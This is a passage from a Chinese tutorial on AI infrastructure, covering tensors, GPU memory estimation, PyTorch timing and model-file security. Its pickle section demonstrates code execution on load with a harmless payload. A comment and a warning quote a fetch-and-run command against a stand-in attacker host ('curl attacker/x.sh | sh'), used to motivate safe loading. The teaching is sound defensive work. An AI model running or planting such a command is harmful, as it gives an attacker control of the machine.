{"slug":"py-stage4-ai-infra",
 "title":"阶段四：AI Infrastructure 核心栈（16 小时，含全部可运行代码）",
 "summary":"张量思维、显存口算器、safetensors 与 pickle 的攻击面、不需要 GPU 的 OpenAI 兼容推理服务、Ray/K8s GPU 编排、Prometheus 埋点。四个心智模型全部配可运行代码。",
 "eyebrow":"阶段四 / 5 · Stage 4",
 "h1":"AI Infrastructure 核心栈",
 "sub":"这是整条路线的重头戏。你的定位是 infra 工程师，不是算法工程师 —— 不需要会推导反向传播，需要会让模型跑得稳、快、省。四个心智模型：张量、显存、批处理、推理引擎。",
 "facts":["<b>16 小时</b>","<b>不需要 GPU</b> 也能跑完大半","练习 <b>5 个</b> + 动手 1 个","产出：<b>显存口算器 + 推理服务</b>"],
 "footer":"看板任务 #425「Python学习」· 本页是<a href=\"/p/python-ai-infra-40h.html\">《40 小时学习路线》(#422)</a> 阶段四的实操展开版。NumPy / 显存 / 服务化部分的代码与输出均实测；PyTorch 与 vLLM 部分需要 GPU 环境，已明确标注。"}
---FM---

:::goal 这一页结束时，你应该能做到
- 一眼看出张量 shape 对不对，并说清 broadcasting 什么时候会**静默出错**
- **口算显存**：7B 模型 bf16 要多少、KV cache 每 token 多少、一张 A100 能扛多少并发
- 解释为什么 int4 量化几乎**不增加**并发，以及什么才是并发的真正瓶颈
- 说清 prefill / decode 两个阶段的瓶颈不同，以及 TTFT / TPOT / 吞吐怎么定义
- 在没有 GPU 的笔记本上，把 OpenAI 兼容服务的流式、取消、埋点全部跑通
:::

:::note 关于 GPU
本页大部分内容**不需要 GPU**：NumPy、显存口算、服务化、埋点都能在笔记本上跑完，输出都是实测的。

需要 GPU 的只有两处（PyTorch 运行时、真 vLLM），已经单独标注。**没有 GPU 不影响你完成 90% 的练习** —— 这也是本页刻意的设计：infra 的考点在服务化和容量，不在炼丹。
:::

---

## 1. 张量思维：五件要形成肌肉记忆的事

张量 = 多维数组 + `dtype` + `shape` + 内存布局。

```python
"""阶段四 4.1 —— 张量思维。五件必须形成肌肉记忆的事。"""
from __future__ import annotations

import time

import numpy as np

rng = np.random.default_rng(0)

# ── 1. shape / dtype / 内存：养成写注释的习惯 ────────────────────────
x = rng.standard_normal((32, 128), dtype=np.float32)   # (batch, dim)
w = rng.standard_normal((128, 512), dtype=np.float32)  # (dim, hidden)
y = x @ w                                              # (batch, hidden)
print(f"1. x{x.shape} @ w{w.shape} -> y{y.shape}  dtype={y.dtype}  {y.nbytes/1024:.0f} KiB")
print(f"1. 口算：{32*512} 个元素 × 4 字节 = {32*512*4/1024:.0f} KiB  ✓")

# dtype 就是显存。这张表你要能背下来
for dt in (np.float32, np.float16, np.int8):
    a = np.zeros((1024, 1024), dtype=dt)
    print(f"1. 1024×1024 的 {np.dtype(dt).name:<8} = {a.nbytes/2**20:5.2f} MiB"
          f"  （每元素 {a.itemsize} 字节）")

# ── 2. broadcasting：不懂它就会写出"静默正确但结果全错"的代码 ────────
print("\n2. 广播规则：从**右往左**逐维比较，相等或其一为 1 才能对齐")
logits = rng.standard_normal((4, 5))          # (batch=4, vocab=5)
bias_ok = rng.standard_normal((5,))           # (5,)   → 广播到每一行 ✅
print(f"   (4,5) + (5,)   -> {(logits + bias_ok).shape}  ← 每行加同一个 bias，对")
bias_col = rng.standard_normal((4, 1))        # (4,1)  → 广播到每一列 ✅
print(f"   (4,5) + (4,1)  -> {(logits + bias_col).shape}  ← 每行加各自的数，也对")
try:
    logits + rng.standard_normal((4,))        # (4,)  右对齐后是 (1,4) vs (4,5) ❌
except ValueError as e:
    print(f"   (4,5) + (4,)   -> ValueError: {e}")
print("   ⚠️ 真正危险的是**不报错**的那种：")
a = np.arange(3).reshape(3, 1)                # (3,1)
b = np.arange(3)                              # (3,)
print(f"   (3,1) + (3,) 悄悄变成了 {(a + b).shape} —— 你以为在逐元素加，其实做了外积")
print(f"   {(a + b).tolist()}")

# ── 3. 向量化 vs 循环：实测差距 ──────────────────────────────────────
print("\n3. 同一件事，两种写法")
N = 1_000_000
va, vb = rng.standard_normal(N, dtype=np.float32), rng.standard_normal(N, dtype=np.float32)

t0 = time.perf_counter()
out_loop = [va[i] * vb[i] + 1.0 for i in range(N)]
t_loop = time.perf_counter() - t0

t0 = time.perf_counter()
out_vec = va * vb + 1.0
t_vec = time.perf_counter() - t0
print(f"   Python 循环   {t_loop*1000:8.1f} ms")
print(f"   NumPy 向量化  {t_vec*1000:8.1f} ms   快 {t_loop/t_vec:.0f}×"
      f"   结果一致={np.allclose(out_loop, out_vec)}")
print("   → 判断标准很简单：你在对几百万个元素写 for 循环 = 写错了。")

# ── 4. view vs copy：改了视图就是改了原数据 ──────────────────────────
print("\n4. 切片/reshape 通常只是**视图**，不是拷贝")
base = np.arange(12).reshape(3, 4).copy()   # .copy() 保证 base 自己是"拥有数据"的
view = base[:, :2]                            # 视图
view[0, 0] = 999
print(f"   改 view 之后 base[0,0] = {base[0,0]}  ← 原数组被改了！")
print(f"   base.base is None: {base.base is None}   view.base is base: {view.base is base}")
cp = base[:, :2].copy()                       # 显式拷贝才安全
cp[0, 0] = -1
print(f"   改 copy 之后 copy[0,0]={cp[0,0]}，但 base[0,0]={base[0,0]}  ← 原数组没被影响")

# transpose 之后内存不连续，很多算子会偷偷替你复制一次
t = base.T
print(f"   base 连续={base.flags['C_CONTIGUOUS']}  base.T 连续={t.flags['C_CONTIGUOUS']}"
      f"  → PyTorch 里这时要 .contiguous()")

# ── 5. 手写一次 softmax 和注意力，把 shape 语义刻进脑子 ───────────────
print("\n5. 从零实现 scaled dot-product attention（AI Infra 面试常考）")


def softmax(z: np.ndarray, axis: int = -1) -> np.ndarray:
    """数值稳定版：先减去最大值，否则 exp 会溢出成 inf。"""
    z = z - z.max(axis=axis, keepdims=True)      # keepdims 是为了能广播回去
    e = np.exp(z)
    return e / e.sum(axis=axis, keepdims=True)


def attention(q, k, v, mask=None):
    """q,k,v: (batch, heads, seq, head_dim)"""
    d_k = q.shape[-1]
    scores = q @ k.swapaxes(-2, -1) / np.sqrt(d_k)     # (b, h, seq, seq)
    if mask is not None:
        scores = np.where(mask, scores, -np.inf)        # 因果掩码
    return softmax(scores) @ v, scores                  # (b, h, seq, head_dim)


B, H, S, D = 2, 4, 6, 16
q = rng.standard_normal((B, H, S, D), dtype=np.float32)
k = rng.standard_normal((B, H, S, D), dtype=np.float32)
v = rng.standard_normal((B, H, S, D), dtype=np.float32)
causal = np.tril(np.ones((S, S), dtype=bool))          # 下三角：只能看见过去
out, scores = attention(q, k, v, causal)
print(f"   q{q.shape} k{k.shape} v{v.shape} -> out{out.shape}")
print(f"   注意力矩阵 {scores.shape}，随 seq **平方**增长 —— 这就是长上下文贵的原因")
print(f"   每行权重和应为 1：{softmax(np.where(causal, scores, -np.inf))[0,0].sum(-1)}")

seq = 8192
print(f"\n   若 seq={seq}, heads={H}, batch={B}, fp16：注意力矩阵本身就要 "
      f"{B*H*seq*seq*2/2**30:.1f} GiB —— FlashAttention 解决的就是这块。")
```

:::out 实际输出
```text
1. x(32, 128) @ w(128, 512) -> y(32, 512)  dtype=float32  64 KiB
1. 口算：16384 个元素 × 4 字节 = 64 KiB  ✓
1. 1024×1024 的 float32  =  4.00 MiB  （每元素 4 字节）
1. 1024×1024 的 float16  =  2.00 MiB  （每元素 2 字节）
1. 1024×1024 的 int8     =  1.00 MiB  （每元素 1 字节）

2. 广播规则：从**右往左**逐维比较，相等或其一为 1 才能对齐
   (4,5) + (5,)   -> (4, 5)  ← 每行加同一个 bias，对
   (4,5) + (4,1)  -> (4, 5)  ← 每行加各自的数，也对
   (4,5) + (4,)   -> ValueError: operands could not be broadcast together with shapes (4,5) (4,)
   ⚠️ 真正危险的是**不报错**的那种：
   (3,1) + (3,) 悄悄变成了 (3, 3) —— 你以为在逐元素加，其实做了外积
   [[0, 1, 2], [1, 2, 3], [2, 3, 4]]

3. 同一件事，两种写法
   Python 循环      278.6 ms
   NumPy 向量化       0.8 ms   快 350×   结果一致=True
   → 判断标准很简单：你在对几百万个元素写 for 循环 = 写错了。

4. 切片/reshape 通常只是**视图**，不是拷贝
   改 view 之后 base[0,0] = 999  ← 原数组被改了！
   base.base is None: True   view.base is base: True
   改 copy 之后 copy[0,0]=-1，但 base[0,0]=999  ← 原数组没被影响
   base 连续=True  base.T 连续=False  → PyTorch 里这时要 .contiguous()

5. 从零实现 scaled dot-product attention（AI Infra 面试常考）
   q(2, 4, 6, 16) k(2, 4, 6, 16) v(2, 4, 6, 16) -> out(2, 4, 6, 16)
   注意力矩阵 (2, 4, 6, 6)，随 seq **平方**增长 —— 这就是长上下文贵的原因
   每行权重和应为 1：[1. 1. 1. 1. 1. 1.]

   若 seq=8192, heads=4, batch=2, fp16：注意力矩阵本身就要 1.0 GiB —— FlashAttention 解决的就是这块。
```
:::

:::warn 广播里真正危险的不是报错，是不报错
`(4,5) + (4,)` 会抛 `ValueError` —— 这是**好事**，你立刻知道写错了。

`(3,1) + (3,)` 不报错，它悄悄变成 `(3,3)` 做了个**外积**。你以为在"给每个样本加个偏置"，实际得到了一个矩阵。

这种 bug 在训练里表现为"loss 不降但也不崩"，在推理里表现为"输出是通顺的胡话"。**排查成本极高，因为没有任何报错。**

两条防御：
1. **每个张量在注释里写 shape 语义**：`# (batch, seq, hidden)`，而不只是 `# 输入`
2. **关键位置加断言**：`assert logits.shape == (batch, vocab), logits.shape`。这是 Python 版的类型检查，在张量代码里比 mypy 有用得多
:::

:::note 最后那行的 1.0 GiB 值得停一下
`batch=2, heads=4, seq=8192` 这么一组不算大的参数，光**注意力分数矩阵**就要 1 GiB —— 而且它和模型权重、KV cache 是**分开**的额外开销。

因为它是 O(seq²)：seq 翻倍，这块显存翻**四倍**。

FlashAttention 做的事就是**不把这个矩阵完整地实例化出来** —— 它分块计算、在片上 SRAM 里完成 softmax，显存占用从 O(seq²) 降到 O(seq)。这是"长上下文变得可行"的关键工程突破，也是你面试时该能讲清楚的一条。
:::

---

## 2. PyTorch：不学炼丹，学运行时

:::warn 本节需要 GPU
下面的代码需要一台有 CUDA 的机器。没有的话先读懂，`1.5` 小节的显存口算器不需要 GPU，那个更重要。
:::

infra 视角只关心六件事：

```python
"""PyTorch 的 infra 视角。需要 GPU。"""
import time

import torch

# ── 1. 设备与拷贝：CPU↔GPU 是显式且昂贵的 ──────────────────────────
x = torch.randn(4096, 4096, dtype=torch.bfloat16)       # 先在 CPU 上
print(f"device={x.device} dtype={x.dtype} {x.element_size() * x.nelement() / 2**20:.0f} MiB")
x = x.to("cuda", non_blocking=True)                     # 拷到 GPU

# pin_memory 让 H2D 拷贝能异步进行（DataLoader 里默认该开）
cpu_pinned = torch.randn(4096, 4096).pin_memory()

# ── 2. ★ CUDA 是异步的：不 synchronize 的计时全是假的 ──────────────
def bench_wrong(fn, n=50):
    t0 = time.perf_counter()
    for _ in range(n):
        fn()
    return (time.perf_counter() - t0) / n            # ← 只测到了"提交"耗时

def bench_right(fn, n=50, warmup=10):
    for _ in range(warmup):                          # ★ 预热：首次调用要编译 kernel
        fn()
    torch.cuda.synchronize()                         # ★ 等前面的活儿全干完
    t0 = time.perf_counter()
    for _ in range(n):
        fn()
    torch.cuda.synchronize()                         # ★ 等这一批全干完
    return (time.perf_counter() - t0) / n

w = torch.randn(4096, 4096, dtype=torch.bfloat16, device="cuda")
print(f"错误计时 {bench_wrong(lambda: x @ w)*1e3:7.3f} ms   ← 通常小一个数量级")
print(f"正确计时 {bench_right(lambda: x @ w)*1e3:7.3f} ms")

# ── 3. 显存：allocated vs reserved，和 nvidia-smi 对不上是正常的 ────
def mem() -> str:
    a = torch.cuda.memory_allocated() / 2**30
    r = torch.cuda.memory_reserved() / 2**30
    return f"allocated={a:.2f} GiB  reserved={r:.2f} GiB（nvidia-smi 看到的是这个）"

print(mem())
big = torch.empty(8192, 8192, dtype=torch.bfloat16, device="cuda")
print("分配之后 ", mem())
del big
print("del 之后  ", mem(), "← reserved 不降：PyTorch 的缓存分配器留着复用")
torch.cuda.empty_cache()
print("empty_cache", mem(), "← 还给驱动了，但下次分配会更慢")

# ── 4. 推理路径一律 inference_mode ──────────────────────────────────
with torch.inference_mode():          # 比 no_grad 更彻底：连版本计数都不记
    y = x @ w
print(f"inference_mode 下 requires_grad={y.requires_grad}")

# ── 5. state_dict 就是一个张量字典 —— 理解这点，模型加载就不神秘了 ──
import torch.nn as nn

model = nn.Sequential(nn.Linear(128, 512), nn.GELU(), nn.Linear(512, 128))
sd = model.state_dict()
total = sum(t.numel() for t in sd.values())
print(f"\nstate_dict 有 {len(sd)} 个张量，共 {total:,} 个参数")
for name, tensor in sd.items():
    print(f"  {name:<12} {str(tuple(tensor.shape)):<12} {tensor.dtype}")
print("→ 模型 = 结构（代码）+ 权重（state_dict）。checkpoint 只是后者。")
print("→ 所以模型转换、分片、量化，本质都是在操作这个字典。")

# ── 6. OOM 时的自救 ────────────────────────────────────────────────
print(torch.cuda.memory_summary(abbreviated=True))   # 分配器的详细账本
```

:::warn 「不 synchronize 就计时」是 AI Infra 的头号新手错误
GPU 调用是**异步提交**的：`x @ w` 这一行返回时，kernel 可能还没开始跑。

不加 `torch.cuda.synchronize()`，你测到的是"把任务塞进队列"的耗时 —— 通常比真实耗时小一个数量级。于是你会得出"这个算子只要 0.05 ms"的荒谬结论，然后基于它做错所有优化决策。

**正确的 benchmark 模板**（记住这四步）：
1. **warmup** —— 首次调用要编译/加载 kernel，必须排除
2. `torch.cuda.synchronize()` —— 清空之前的队列
3. 跑 N 次
4. `torch.cuda.synchronize()` —— 再等完，然后除以 N

更省事的办法是用 `torch.cuda.Event` 打点，或者直接用 `torch.utils.benchmark.Timer`（它替你处理了这一切）。
:::

:::note `memory_allocated` vs `memory_reserved`：为什么 nvidia-smi 的数字总是更大
PyTorch 有自己的**缓存分配器**：它向驱动一次要一大块（reserved），再从这块里切给张量（allocated）。`del` 一个张量只是把它还给缓存池，**不还给驱动**。

所以：
- `nvidia-smi` 显示的是 **reserved**（对驱动而言这些显存被占着）
- 你代码里真正用到的是 **allocated**
- 两者的差额就是缓存池里的空闲块

**这解释了两个常见困惑**：
1. "我明明 del 了，为什么 nvidia-smi 没降？" —— 正常，缓存分配器留着复用（这是好事，重新向驱动要显存很慢）
2. "还有 10 GiB 空闲为什么还 OOM？" —— **碎片化**。缓存池里有 10 GiB，但都是小块，凑不出你要的连续 8 GiB。这时 `PYTORCH_CUDA_ALLOC_CONF=expandable_segments:True` 往往能救命。
:::

必须知道名字的六个加速手段：

| 手段 | 解决什么问题 | 何时用 |
|---|---|---|
| `torch.compile` | 算子融合、减少 kernel 启动开销 | 稳定的推理图，首次编译慢 |
| AMP / bf16 | 显存减半、张量核心加速 | 几乎总是该用 |
| **FlashAttention** | 注意力的 O(seq²) 显存 | 长上下文必需 |
| **PagedAttention** | KV cache 碎片 | 用 vLLM 就自带 |
| CUDA Graphs | 消除小 kernel 的 CPU 提交开销 | decode 阶段收益大 |
| 投机解码 | 用小模型草稿 + 大模型验证 | 低并发时降低时延 |

---

## 3. 显存口算器 ★（不需要 GPU）

这是全页最该动手跑的一节。面试题「7B 模型 bf16 要多少显存」的完整答案是：**权重 14 GiB，但能服务多少并发由 KV cache 决定** —— 后半句才是重点。

三块显存：

```text
权重    = 参数量 × 每参数字节数                      （静态，开机就占）
KV 缓存 = 2 × layers × kv_heads × head_dim × 字节
          × 序列长度 × 并发数                        （★ 随并发线性增长）
其它    = 激活 + 框架开销 + 碎片                     （经验值：留 10~15%）
```

```python
#!/usr/bin/env python3
"""阶段四 4.2 —— 显存口算器。不需要 GPU 就能跑，但能救你很多次 OOM。"""
from __future__ import annotations

import argparse
from dataclasses import dataclass

GIB = 2**30

# 每个"元素"占多少字节。量化只压**权重**，KV 缓存默认仍是 fp16/bf16。
BYTES = {"fp32": 4.0, "bf16": 2.0, "fp16": 2.0, "fp8": 1.0, "int8": 1.0, "int4": 0.5}


@dataclass(frozen=True, slots=True)
class ModelConfig:
    """这些字段全部来自 HuggingFace 的 config.json —— 别背，去查。

    对应关系：
        layers     ← num_hidden_layers
        heads      ← num_attention_heads
        kv_heads   ← num_key_value_heads   （等于 heads 表示没用 GQA）
        head_dim   ← hidden_size / heads   （或显式的 head_dim）
    """

    name: str
    params: float        # 参数量（个）
    layers: int
    heads: int
    kv_heads: int
    head_dim: int

    def weights_gib(self, dtype: str) -> float:
        return self.params * BYTES[dtype] / GIB

    def kv_bytes_per_token(self, kv_dtype: str = "fp16") -> float:
        """★ 最该记住的一个公式。2 是因为要同时存 K 和 V。"""
        return 2 * self.layers * self.kv_heads * self.head_dim * BYTES[kv_dtype]

    def kv_gib(self, seq_len: int, concurrency: int, kv_dtype: str = "fp16") -> float:
        return self.kv_bytes_per_token(kv_dtype) * seq_len * concurrency / GIB

    def max_concurrency(self, gpu_gib: float, seq_len: int, *, dtype: str = "bf16",
                        kv_dtype: str = "fp16", overhead: float = 0.10) -> int:
        """给定一张卡，能同时装下几个满长度的请求？"""
        usable = gpu_gib * (1 - overhead) - self.weights_gib(dtype)
        if usable <= 0:
            return 0
        per_req = self.kv_gib(seq_len, 1, kv_dtype)
        return int(usable / per_req)


# 示例配置。⚠️ 数字会随模型版本变化，**以你要部署的那个 repo 的 config.json 为准**。
CATALOG = {
    "llama-3.1-8b":  ModelConfig("Llama-3.1-8B",  8.03e9, 32, 32,  8, 128),
    "qwen3-8b":      ModelConfig("Qwen3-8B",      8.19e9, 36, 32,  8, 128),
    "qwen3-32b":     ModelConfig("Qwen3-32B",    32.80e9, 64, 64,  8, 128),
    "llama-3.1-70b": ModelConfig("Llama-3.1-70B",70.60e9, 80, 64,  8, 128),
    "mha-7b-no-gqa": ModelConfig("7B（没有 GQA，对照组）", 7.00e9, 32, 32, 32, 128),
}

GPUS = {"A10G": 24, "L40S": 48, "A100-40G": 40, "A100-80G": 80, "H100-80G": 80}


def report(cfg: ModelConfig, gpu: str, gpu_gib: float, dtype: str, seq: int) -> None:
    w = cfg.weights_gib(dtype)
    per_tok_kib = cfg.kv_bytes_per_token() / 1024
    per_req = cfg.kv_gib(seq, 1)
    n = cfg.max_concurrency(gpu_gib, seq, dtype=dtype)
    print(f"\n{cfg.name}  @ {gpu} ({gpu_gib:g} GiB)  权重 {dtype}  上下文 {seq:,}")
    print(f"  权重            {w:7.2f} GiB")
    print(f"  KV / token      {per_tok_kib:7.1f} KiB      "
          f"(= 2 × {cfg.layers}层 × {cfg.kv_heads}个KV头 × {cfg.head_dim} × 2字节)")
    print(f"  KV / 满长度请求  {per_req:7.2f} GiB")
    print(f"  预留开销 10%    {gpu_gib*0.10:7.2f} GiB")
    print(f"  ⇒ 可并发        {n:5d} 个满长度请求"
          + ("   ⚠️ 权重都装不下，需要张量并行/量化" if n == 0 else ""))


def main() -> None:
    p = argparse.ArgumentParser(description="LLM 显存口算器")
    p.add_argument("--model", default="llama-3.1-8b", choices=sorted(CATALOG))
    p.add_argument("--gpu", default="A100-80G", choices=sorted(GPUS))
    p.add_argument("--dtype", default="bf16", choices=sorted(BYTES))
    p.add_argument("--seq", type=int, default=4096)
    p.add_argument("--sweep", action="store_true", help="打印几张对照表")
    a = p.parse_args()

    report(CATALOG[a.model], a.gpu, GPUS[a.gpu], a.dtype, a.seq)
    if not a.sweep:
        return

    print("\n" + "=" * 78)
    print("表 1：量化省的是**权重**，不是 KV 缓存（Llama-3.1-8B @ A100-80G, 4k 上下文）")
    print(f"  {'权重精度':<8}{'权重(GiB)':>12}{'可并发':>10}")
    m = CATALOG["llama-3.1-8b"]
    for dt in ("fp32", "bf16", "fp8", "int4"):
        print(f"  {dt:<10}{m.weights_gib(dt):>10.2f}{m.max_concurrency(80, 4096, dtype=dt):>10d}")
    print("  → int4 把权重压到 1/4，但并发只多了一点点：瓶颈早就是 KV 缓存了。")

    print("\n表 2：GQA 才是并发的关键（bf16 @ A100-80G, 4k 上下文）")
    print(f"  {'模型':<26}{'KV/token':>11}{'可并发':>10}")
    for key in ("llama-3.1-8b", "mha-7b-no-gqa"):
        c = CATALOG[key]
        print(f"  {c.name:<26}{c.kv_bytes_per_token()/1024:>9.0f}KiB"
              f"{c.max_concurrency(80, 4096):>10d}")
    print("  → 同样 7~8B、同一张卡，有没有 GQA 差 4 倍并发。")

    print("\n表 3：上下文长度是并发的头号杀手（Llama-3.1-8B bf16 @ A100-80G）")
    print(f"  {'上下文':>10}{'KV/请求(GiB)':>16}{'可并发':>10}")
    for s in (2048, 8192, 32768, 131072):
        print(f"  {s:>10,}{m.kv_gib(s,1):>14.2f}{m.max_concurrency(80, s):>10d}")
    print("  → 把 max_model_len 从 128k 调到 8k，吞吐可能直接翻十几倍。")
    print("    这是推理服务最容易被忽略、却最见效的一个旋钮。")

    print("\n表 4：70B 装不进单卡时怎么办（4k 上下文）")
    big = CATALOG["llama-3.1-70b"]
    for dt in ("bf16", "fp8", "int4"):
        w = big.weights_gib(dt)
        cards = -(-int(w * 1.15) // 80) or 1
        print(f"  {dt:<6} 权重 {w:6.2f} GiB → 单卡80G {'装得下' if w < 72 else '装不下'}"
              f"，至少需要 {cards} 张（张量并行 TP={cards}）")


if __name__ == "__main__":
    main()
```

:::out `python vram.py --sweep`
```text
Llama-3.1-8B  @ A100-80G (80 GiB)  权重 bf16  上下文 4,096
  权重              14.96 GiB
  KV / token        128.0 KiB      (= 2 × 32层 × 8个KV头 × 128 × 2字节)
  KV / 满长度请求     0.50 GiB
  预留开销 10%       8.00 GiB
  ⇒ 可并发          114 个满长度请求

==============================================================================
表 1：量化省的是**权重**，不是 KV 缓存（Llama-3.1-8B @ A100-80G, 4k 上下文）
  权重精度         权重(GiB)       可并发
  fp32           29.91        84
  bf16           14.96       114
  fp8             7.48       129
  int4            3.74       136
  → int4 把权重压到 1/4，但并发只多了一点点：瓶颈早就是 KV 缓存了。

表 2：GQA 才是并发的关键（bf16 @ A100-80G, 4k 上下文）
  模型                           KV/token       可并发
  Llama-3.1-8B                    128KiB       114
  7B（没有 GQA，对照组）                  512KiB        29
  → 同样 7~8B、同一张卡，有没有 GQA 差 4 倍并发。

表 3：上下文长度是并发的头号杀手（Llama-3.1-8B bf16 @ A100-80G）
         上下文      KV/请求(GiB)       可并发
       2,048          0.25       228
       8,192          1.00        57
      32,768          4.00        14
     131,072         16.00         3
  → 把 max_model_len 从 128k 调到 8k，吞吐可能直接翻十几倍。
    这是推理服务最容易被忽略、却最见效的一个旋钮。

表 4：70B 装不进单卡时怎么办（4k 上下文）
  bf16   权重 131.50 GiB → 单卡80G 装不下，至少需要 2 张（张量并行 TP=2）
  fp8    权重  65.75 GiB → 单卡80G 装得下，至少需要 1 张（张量并行 TP=1）
  int4   权重  32.88 GiB → 单卡80G 装得下，至少需要 1 张（张量并行 TP=1）
```
:::

:::warn 表 1 推翻了一个非常流行的误解
「用 int4 量化，显存省 4 倍，所以能多服务 4 倍的用户」—— **错。**

看数字：int4 把权重从 14.96 GiB 压到 3.74 GiB，省下 11 GiB。但并发只从 114 涨到 136（**+19%**）。

因为在 80 GiB 的卡上，权重本来就只占 19%，剩下 57 GiB 全是 KV cache 的地盘。省掉的 11 GiB 相对 57 GiB 只是零头。

**量化的真正价值是让模型"装得进"更小的卡**（表 4：70B 从"要两张 80G"变成"一张就够"），而不是提升并发。

**提升并发要看别的旋钮**：GQA（表 2，4 倍）、`max_model_len`（表 3，最多 76 倍）、KV cache 量化（fp8 KV 直接对半砍）。
:::

:::note 表 3 是你上任第一周就该去调的东西
很多团队把 `max_model_len` 设成模型支持的最大值（128k），觉得"反正用不到不占地方"。

**但 vLLM 是按 `max_model_len` 预留 KV cache 块的** —— 于是每个请求槽位都按最坏情况占地方，一张 A100 只能跑 3 个并发。

如果你的业务 P99 输入只有 6k token，把它调到 8k：**并发从 3 涨到 57，吞吐 19 倍**。超长请求单独路由到一个专用实例。

这是一行配置，通常是新人能做的最大一笔性能改进。
:::

:::exercise 动手 · 用你自己的模型跑一遍
1. 去 HuggingFace 找你要部署的模型，打开 `config.json`
2. 抄出 `num_hidden_layers` / `num_attention_heads` / `num_key_value_heads` / `hidden_size`
3. 加进 `CATALOG`，跑一遍 `--sweep`
4. 回答：**你们那张卡，这个模型最多能扛多少并发？瓶颈是权重还是 KV？**

能回答这个问题，你就已经比很多"会调 API 的 AI 工程师"更接近 infra 岗了。
:::

---

## 4. 模型工件层：safetensors 与 pickle 的攻击面

```python
"""阶段四 4.3 —— 模型工件层：为什么 infra 侧必须禁止加载不可信的 pickle。

这不是理论风险。`.bin` / `.pt` / `.ckpt` 本质是 pickle，
**反序列化就等于执行代码** —— 下面几行就能证明，无害地。
"""
from __future__ import annotations

import json
import pickle
import struct
import tempfile
from pathlib import Path

# ── 1. pickle 的反序列化 = 任意代码执行 ──────────────────────────────
class InnocentLookingCheckpoint:
    """看起来就是个普通的权重字典。"""

    def __reduce__(self):
        # 这个魔法方法告诉 pickle "怎么重建我"。攻击者写什么，机器就执行什么。
        # 真实攻击会写 os.system("curl attacker/x.sh | sh")；这里只是打印。
        return (print, ("   ☠️  [payload] 我在 torch.load() 的那一刻就运行了",))


blob = pickle.dumps(InnocentLookingCheckpoint())
print("1. 一个 %d 字节的 '权重文件'。现在'加载'它：" % len(blob))
pickle.loads(blob)          # ← 等价于 torch.load(f)，weights_only=False 时
print("   → 注意：我们一次都没有调用那个类的方法，只是反序列化。\n")

# ── 2. safetensors 为什么安全：它根本不是可执行格式 ──────────────────
print("2. safetensors 的文件结构（手写一个，8 行就够）")


def write_safetensors(path: Path, tensors: dict[str, list[float]]) -> None:
    """格式：[8 字节头长度][JSON 头][紧接着的原始字节]。没有代码，只有数据。"""
    header, payload, offset = {}, bytearray(), 0
    for name, values in tensors.items():
        raw = struct.pack(f"<{len(values)}f", *values)
        header[name] = {"dtype": "F32", "shape": [len(values)],
                        "data_offsets": [offset, offset + len(raw)]}
        payload += raw
        offset += len(raw)
    head = json.dumps(header).encode()
    head += b" " * ((8 - len(head) % 8) % 8)           # 对齐到 8 字节
    path.write_bytes(struct.pack("<Q", len(head)) + head + bytes(payload))


def read_header(path: Path) -> dict:
    """★ 关键：只读头就能知道有哪些张量、多大 —— 不用把权重读进内存。"""
    with path.open("rb") as f:
        n = struct.unpack("<Q", f.read(8))[0]
        return json.loads(f.read(n))


with tempfile.TemporaryDirectory() as d:
    p = Path(d) / "model.safetensors"
    write_safetensors(p, {"layer0.weight": [1.0, 2.0, 3.0, 4.0],
                          "layer0.bias": [0.1, 0.2]})
    print(f"   文件 {p.stat().st_size} 字节")
    print(f"   只读头拿到的元信息：{json.dumps(read_header(p), ensure_ascii=False)}")
```

:::out 实际输出
```text
1. 一个 105 字节的 '权重文件'。现在'加载'它：
   ☠️  [payload] 我在 torch.load() 的那一刻就运行了
   → 注意：我们一次都没有调用那个类的方法，只是反序列化。

2. safetensors 的文件结构（手写一个，8 行就够）
   文件 184 字节
   只读头拿到的元信息：{"layer0.weight": {"dtype": "F32", "shape": [4], "data_offsets": [0, 16]}, "layer0.bias": {"dtype": "F32", "shape": [2], "data_offsets": [16, 24]}}
```
:::

:::warn 105 个字节就能在你的 GPU 机器上执行任意代码
上面那段 payload 只是 `print`。真实的会是 `os.system("curl attacker.sh | sh")` —— 而它运行在**你最值钱的那台机器上**：有 GPU、有模型权重、通常还有云凭证。

这是一条真实的供应链攻击路径，不是理论。**infra 侧的三条防线，三条都要做**：

| # | 防线 | 怎么做 |
|---|---|---|
| 1 | 加载时 | `torch.load(..., weights_only=True)`（PyTorch 2.6 起是默认值，但老代码要检查） |
| 2 | 制品库 | CI 里拒绝 `.bin` / `.pt` / `.ckpt` 入库，只接受 `.safetensors` |
| 3 | 来源 | commit sha 固定 + 校验和 + 来源白名单（和你管 Maven 私服是一回事） |

**这是 Java 人的优势区**：你对 Log4Shell、依赖投毒、私服白名单这套东西本来就熟。AI 团队里很多人没有这个意识 —— 这正是你能立刻贡献价值的地方。
:::

safetensors 的三个优点：

1. **无代码执行面** —— 纯数据格式，不可能"加载即执行"
2. **零拷贝 mmap** —— 加载 70B 不需要先把它读进 RAM，直接内存映射
3. **读头就能拿到清单** —— 上面那个 `read_header` 只读几百字节就知道有哪些张量、多大。做校验、做分片规划、做显存预估全靠它

### 量化方案速查

| 方案 | 字节/参数 | 显存比 | 质量损失 | 硬件加速 | 适用场景 |
|---|---|---|---|---|---|
| bf16 基线 | 2.0 | 100% | — | 全部 | 默认，质量优先 |
| fp8 (W8A8) | 1.0 | 50% | 极小 | H100/H200/Ada+ | 有新卡时的首选 |
| int8 (W8A8) | 1.0 | 50% | 很小 | Ampere+ | A100/A10G 上的实用档 |
| AWQ int4 | 0.5 | 25% | 小 | Ampere+（反量化） | 显存紧张、批量小 |
| GPTQ int4 | 0.5 | 25% | 小~中 | Ampere+ | 同上，工具链更老 |
| GGUF Qx | 0.5 | 25% | 看档位 | CPU / Metal 为主 | 本地/边缘，不是数据中心 |

:::warn 量化的三个常见误解
- **「int4 能让吞吐翻 4 倍」** —— 不会。decode 阶段是**访存**瓶颈，权重小了确实有帮助，但 KV cache 没变小，批量大时收益迅速衰减（见上一节表 1：并发只 +19%）。
- **「量化只看显存」** —— 还要看这张卡有没有对应精度的**张量核心指令**。在 A100 上跑 fp8 要靠软件模拟，可能反而更慢。
- **「掉点很小所以随便用」** —— 掉点在长尾任务（代码、数学、多语言）上放大得最厉害，必须用你**自己的**评测集测过再上线。
:::

### HuggingFace 缓存：容器化部署必踩

```bash
HF_HOME=/models        # 所有缓存的根，容器里一定要显式设

# 目录结构
$HF_HOME/hub/models--<org>--<name>/snapshots/<commit-sha>/*.safetensors
                                  /refs/main            # 分支 → sha 的指针
                                  /blobs/               # 真实文件，snapshots 里是软链
```

三条实践：

